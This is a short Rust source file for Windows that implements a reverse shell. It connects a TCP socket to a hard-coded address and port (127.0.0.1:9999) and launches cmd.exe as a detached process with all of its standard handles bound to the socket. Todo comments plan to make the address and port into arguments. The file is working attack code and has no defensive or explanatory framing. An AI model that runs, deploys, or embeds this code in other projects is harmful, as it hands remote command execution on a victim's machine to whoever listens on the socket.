#[cfg(windows)] extern crate winapi;
use std::mem;
use std::ptr;
use std::ffi::CString;
use winapi::um::winsock2::{
    WSADATA,WSAStartup,WSAPROTOCOL_INFOW,WSASocketW,connect,
};
use winapi::shared::minwindef::{MAKEWORD,DWORD,TRUE};
use winapi::shared::ntdef::{HANDLE};
use winapi::shared::ws2def::{AF_INET,ADDRINFOA,SOCK_STREAM};
use winapi::um::ws2tcpip::getaddrinfo;
use winapi::um::processthreadsapi::{STARTUPINFOW,CreateProcessW,PROCESS_INFORMATION};
use winapi::um::winbase::{STARTF_USESTDHANDLES,CREATE_UNICODE_ENVIRONMENT,DETACHED_PROCESS,CREATE_NEW_PROCESS_GROUP};
use widestring::WideCString;

#[cfg(windows)]
fn shelly(){
    //todo move strings to args, directly assigned as cstrings
    let addr = String::from("127.0.0.1");
    let port = String::from("9999");
    let cmd = String::from("C:\\Windows\\System32\\cmd.exe");         
    let addr_cs = CString::new(addr.as_bytes()).unwrap();
    let port_cs = CString::new(port.as_bytes()).unwrap();
    let cmd_cs = WideCString::from_str(&cmd).unwrap();
    //setup
    let mut wsa_data: WSADATA = unsafe{mem::zeroed()};
    unsafe{
        WSAStartup(MAKEWORD(2,2),&mut wsa_data)
    };
    //init sockaddr_in
    let mut hints: ADDRINFOA = unsafe { mem::zeroed() };
    let mut servinfo: *mut ADDRINFOA = 0 as *mut ADDRINFOA;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = 1;
    unsafe{
        getaddrinfo(addr_cs.as_ptr(),port_cs.as_ptr(), &hints, &mut servinfo);
    };
    //init socket
    let socket = unsafe {
       WSASocketW((*servinfo).ai_family,(*servinfo).ai_socktype,(*servinfo).ai_protocol,
                   mem::transmute::<usize, *mut WSAPROTOCOL_INFOW>(0),0,0)
    };   
    //call socket
    unsafe{
        connect(socket,(*servinfo).ai_addr, (*servinfo).ai_addrlen as i32);
    }
    //init process
    let mut si: STARTUPINFOW = unsafe {mem::zeroed()};
    si.cb = mem::size_of::<STARTUPINFOW>() as DWORD;
    si.hStdInput =  socket as HANDLE;
    si.hStdOutput = socket as HANDLE;
    si.hStdError = socket as HANDLE;
    si.dwFlags = STARTF_USESTDHANDLES;
    let mut pi =PROCESS_INFORMATION {
        hProcess: ptr::null_mut(),
        hThread: ptr::null_mut(),
        dwProcessId: 0,
        dwThreadId: 0,
    };
    //exec Proc
    //todo: check security_attributes and see if detached is needed
    unsafe{
        CreateProcessW(cmd_cs.as_ptr(),ptr::null_mut(),ptr::null_mut(),ptr::null_mut(),TRUE,CREATE_UNICODE_ENVIRONMENT | DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,ptr::null_mut(),ptr::null(),&mut si,&mut pi);    
    }
}

fn main() {
    shelly()
}
